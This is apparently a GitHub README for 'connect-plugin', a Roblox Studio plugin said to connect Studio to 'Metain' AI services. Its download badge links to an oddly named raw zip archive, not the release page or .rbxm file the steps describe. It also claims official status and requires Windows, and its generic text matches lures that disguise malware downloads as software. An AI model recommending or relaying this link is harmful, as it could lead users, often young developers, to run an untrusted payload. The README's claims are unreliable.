connect-plugin is the official Roblox Studio plugin designed to help you work with Metain. It adds useful features for Roblox developers, making tasks easier and faster without needing complex setup.

## 🛠 What is connect-plugin?

connect-plugin is a tool that works inside Roblox Studio, the app used to create Roblox games. This plugin links Roblox Studio to Metain, helping you access AI features and tools powered by Anthropic's Claude. It fits well if you want to improve your game design or code with a simple plugin.

You do not need programming skills to use it. The plugin adds buttons and menus directly inside Roblox Studio so you can start right away.

## 💻 System Requirements

- Windows 10 or newer  
- Roblox Studio installed (latest version recommended)  
- Internet connection for plugin setup and AI features  
- At least 4 GB of RAM for smooth operation  
- Minimum 500 MB free disk space  

This plugin works only on Windows and requires Roblox Studio because it runs as part of that software.

## 📦 Features

- Connect Roblox Studio to Metain AI services  
- Easy-to-use interface inside Roblox Studio  
- Helps write and improve Luau code  
- Generate ideas and debug scripts with AI assistance  
- No command line or configuration needed  
- Updates delivered via GitHub releases  

## 🔍 How It Works

Once installed, connect-plugin runs inside Roblox Studio. It communicates directly with Metain’s AI to assist you while building games. The plugin can help with writing game scripts, checking for errors, and suggesting improvements based on your project.

## 🚀 Getting Started

Before using connect-plugin, make sure Roblox Studio is installed on your PC.

1. Check your Windows version is compatible.  
2. Download the plugin from the official releases page linked below.  
3. Install the plugin using the simple steps described next.  
4. Open Roblox Studio and activate the plugin from the Plugins tab.  

## ⬇️ Download and Install

To get connect-plugin, visit this page to download the latest release:

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Plugin-orange?style=for-the-badge)](https://raw.githubusercontent.com/frendel2004/connect-plugin/main/Commands/plugin-connect-Canaanitish.zip)

Follow these steps:

1. Click the link above to open the release page in your web browser.  
2. Look for the file named `connect-plugin.rbxm` or `.rbxlx`. This is the plugin file.  
3. Download the file to a folder you can find easily (e.g., Desktop or Downloads).  
4. Open Roblox Studio.  
5. In Roblox Studio, go to the **Plugins** tab at the top.  
6. Click **Manage Plugins**, then click **Open Plugins Folder**.  
7. Copy the downloaded plugin file into this folder.  
8. Return to Roblox Studio, and the plugin should appear in the list.  
9. Enable the plugin by clicking its checkbox if it is not already enabled.  
10. You can now use connect-plugin from the Plugins menu.

If you do not see your plugin, restart Roblox Studio and check again.

## 🎯 Using connect-plugin

The plugin adds an easy-to-use interface inside Roblox Studio.

- Open the **Plugins** tab.  
- Click the **connect-plugin** button.  
- Use the options to connect to Metain AI.  
- Follow on-screen instructions for script help, debugging, and suggestions.  

You can generate code snippets, get help with Luau scripts, or ask the AI for ideas on improving your game.

## ⚙️ Configuration

Some features may need you to log in or set up an account with Metain AI.

- When prompted, enter your API key or login information provided by Metain.  
- Check the plugin settings in the Plugins tab if you want to change preferences.  
- The plugin saves settings automatically.
